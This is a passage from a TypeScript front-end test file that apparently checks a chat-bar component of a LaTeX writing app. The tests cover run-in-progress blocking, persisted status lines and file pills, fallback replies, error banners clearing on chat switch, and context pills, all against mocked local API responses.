    // Preserved status line remains visible
    expect(screen.getAllByTestId("chat-status-line").length).toBe(1);
    expect(screen.getByText("Reading main.tex")).toBeTruthy();
  } finally {
    global.fetch = originalFetch;
    bubbleHarness();
  }
});

test("test_send_blocked_across_chats_while_another_run_is_in_flight", async () => {
  bubbleHarness();
  const originalFetch = global.fetch;
  global.fetch = vi.fn(async (input: RequestInfo | URL) => {
    const url = String(input);
    if (url === "/api/projects/p1/chats/chat_current/messages") {
      return jsonResponse({ messages: [] });
    }
    return jsonResponse({});
  }) as any;

  const mockAgentRun: AgentRunController = {
    activeRun: {
      runId: "run-other",
      projectId: "p1",
      chatId: "chat_other",
      profileId: "writing",
      status: "running",
      lines: [{ messageId: "s1", content: "Working in other chat" }],
    },
    pendingHunksByChat: {},
    errorByChat: {},
    startRun: vi.fn(),
    stopRun: vi.fn(),
    clearChatHunks: vi.fn(),
    resolveChatHunk: vi.fn(),
  };

  try {
    render(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar projectId="p1" chatId="chat_current" agentRun={mockAgentRun} />
      )
    );

    const sendBtn = screen.getByRole("button", { name: /Send Prompt/i }) as HTMLButtonElement;
    expect(sendBtn.disabled).toBe(true);
    expect(sendBtn.getAttribute("title")).toBe("A run is already in progress");
    expect(screen.queryByRole("button", { name: "Stop run" })).toBeNull();
  } finally {
    global.fetch = originalFetch;
    bubbleHarness();
  }
});

test("test_reopening_chat_renders_persisted_status_lines_and_pill", async () => {
  bubbleHarness();
  const originalFetch = global.fetch;
  global.fetch = vi.fn(async (input: RequestInfo | URL) => {
    const url = String(input);
    if (url === "/api/ai/runs/active") return jsonResponse({ run: null });
    if (url === "/api/projects/p1/chats/chat_saved/messages") {
      return jsonResponse({
        messages: [
          { role: "user", content: "Fix the abstract", profile_id: "writing" },
          { role: "status", content: "Reading main.tex", pill_file: null },
          { role: "status", content: "Proposed an edit to main.tex", pill_file: "main.tex" },
          { role: "assistant", content: "Here is the revised abstract." },
        ],
      });
    }
    throw new Error(`Unexpected fetch: ${url}`);
  }) as any;

  try {
    render(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar projectId="p1" chatId="chat_saved" />
      )
    );

    await waitFor(() => {
      expect(screen.getByText("Fix the abstract")).toBeTruthy();
      expect(screen.getByText("Here is the revised abstract.")).toBeTruthy();
    });

    const statusLines = screen.getAllByTestId("chat-status-line");
    expect(statusLines.length).toBe(2);
    expect(statusLines[0].querySelector(".lemma-chat-status-text")?.textContent).toBe(
      "Reading main.tex"
    );
    expect(statusLines[1].querySelector(".lemma-chat-status-text")?.textContent).toBe(
      "Proposed an edit to main.tex"
    );
    const pill = screen.getByTestId("chat-status-pill");
    expect(pill.textContent).toBe("main.tex");
    expect(screen.getAllByRole("button", { name: "Copy status line" }).length).toBe(2);
  } finally {
    global.fetch = originalFetch;
    bubbleHarness();
  }
});

test("test_new_chat_notifies_onChatActivity_immediately_on_startRun", async () => {
  bubbleHarness();
  const originalFetch = global.fetch;
  const sse = makeSseStream();
  const onChatActivity = vi.fn();

  global.fetch = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    if (url === "/api/ai/runs/active") return jsonResponse({ run: null });
    if (url.startsWith("/api/projects/p1/chats/") && url.endsWith("/runs") && init?.method === "POST") {
      return jsonResponse({ run_id: "run-new-1", project_id: "p1", chat_id: "c_new", status: "running" }, 201);
    }
    if (url === "/api/ai/runs/run-new-1/events") return sseResponse(sse.stream);
    throw new Error(`Unexpected fetch: ${url}`);
  }) as any;

  try {
    render(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar projectId="p1" chatId={null} onChatActivity={onChatActivity} />
      )
    );
    const input = screen.getByLabelText("AI Chat Prompt");
    fireEvent.change(input, { target: { value: "Hello new chat" } });
    fireEvent.submit(input.closest("form")!);

    await waitFor(() => {
      expect(onChatActivity).toHaveBeenCalledWith(expect.any(String), true);
    });
  } finally {
    sse.close();
    global.fetch = originalFetch;
    bubbleHarness();
  }
});

test("test_agentRun_prop_falls_back_to_lastFinishedRun_when_messages_reload_fails_and_clears_error_on_switch", async () => {
  bubbleHarness();
  const originalFetch = global.fetch;
  global.fetch = vi.fn(async (input: RequestInfo | URL) => {
    const url = String(input);
    if (url === "/api/projects/p1/chats/c1/messages") {
      return jsonResponse({ detail: "Internal error" }, 500);
    }
    if (url === "/api/projects/p1/chats/c2/messages") {
      return jsonResponse({ messages: [{ role: "user", content: "Chat 2" }] });
    }
    throw new Error(`Unexpected fetch: ${url}`);
  }) as any;

  const runningController: AgentRunController = {
    activeRun: {
      runId: "run-ext-1",
      projectId: "p1",
      chatId: "c1",
      profileId: "writing",
      status: "running",
      userPrompt: "Hi",
      lines: [
        { messageId: "s1", content: "Checking file", pillFile: "main.tex" },
        { messageId: "s2", content: "Checking file", pillFile: "main.tex" },
      ],
    },
    pendingHunksByChat: {},
    errorByChat: {},
    lastFinishedRun: null,
    startRun: async () => ({ ok: true }),
    stopRun: async () => {},
    clearChatHunks: () => {},
    resolveChatHunk: () => {},
  };

  try {
    const { rerender } = render(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar projectId="p1" chatId="c1" agentRun={runningController} />
      )
    );

    // Distinct messageIds with identical text + pillFile must both render (Finding 7)
    expect(screen.getAllByTestId("chat-status-line").length).toBe(2);

    const finishedController: AgentRunController = {
      ...runningController,
      activeRun: null,
      lastFinishedRun: {
        runId: "run-ext-1",
        projectId: "p1",
        chatId: "c1",
        status: "completed",
        reply: "Fallback assistant reply",
      },
    };
    rerender(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar projectId="p1" chatId="c1" agentRun={finishedController} />
      )
    );

    await waitFor(() => {
      expect(screen.getByText("Fallback assistant reply")).toBeTruthy();
    });

    // Simulate failed run error banner then switch chat -> errorMessage should clear (Finding 5)
    const erroredController: AgentRunController = {
      ...runningController,
      activeRun: {
        runId: "run-ext-2",
        projectId: "p1",
        chatId: "c1",
        profileId: "writing",
        status: "running",
        lines: [],
      },
    };
    rerender(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar projectId="p1" chatId="c1" agentRun={erroredController} />
      )
    );
    rerender(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar
          projectId="p1"
          chatId="c1"
          agentRun={{
            ...erroredController,
            activeRun: null,
            errorByChat: { "p1:c1": "Boom error" },
          }}
        />
      )
    );
    await waitFor(() => {
      expect(screen.getByRole("alert").textContent).toContain("Boom error");
    });

    rerender(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar projectId="p1" chatId="c2" agentRun={finishedController} />
      )
    );
    await waitFor(() => {
      expect(screen.queryByRole("alert")).toBeNull();
    });
  } finally {
    global.fetch = originalFetch;
    bubbleHarness();
  }
});

test("test_renders_project_index_context_pill", async () => {
  bubbleHarness();
  const originalFetch = global.fetch;
  const context: ChatContextEntry[] = [
    { path: "main.tex", detail: "project index", kind: "active" },
  ];
  global.fetch = vi.fn(async (input: RequestInfo | URL) => {
    const url = String(input);
    if (url === "/api/ai/runs/active") return jsonResponse({ run: null });
    if (url === "/api/projects/p1/chats/chat_index/messages") {
      return jsonResponse({
        messages: [
          {
            role: "user",
            content: "Where is section 2 defined?",
            profile_id: "writing",
            context,
          },
          { role: "status", content: "Reading project index", pill_file: null },
          { role: "assistant", content: "Section 2 is in sections/method.tex." },
        ],
      });
    }
    throw new Error(`Unexpected fetch: ${url}`);
  }) as any;

  try {
    render(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar projectId="p1" chatId="chat_index" />
      )
    );

    await waitFor(() => {
      expect(screen.getByText("Where is section 2 defined?")).toBeTruthy();
    });

    const contextPill = screen.getByTestId("chat-msg-context");
    expect(contextPill.textContent).toContain("main.tex");
    expect(contextPill.textContent).toContain("project index");
    expect(screen.getByTestId("chat-status-line").textContent).toContain(
      "Reading project index"
    );
  } finally {
    global.fetch = originalFetch;
    bubbleHarness();
  }
});
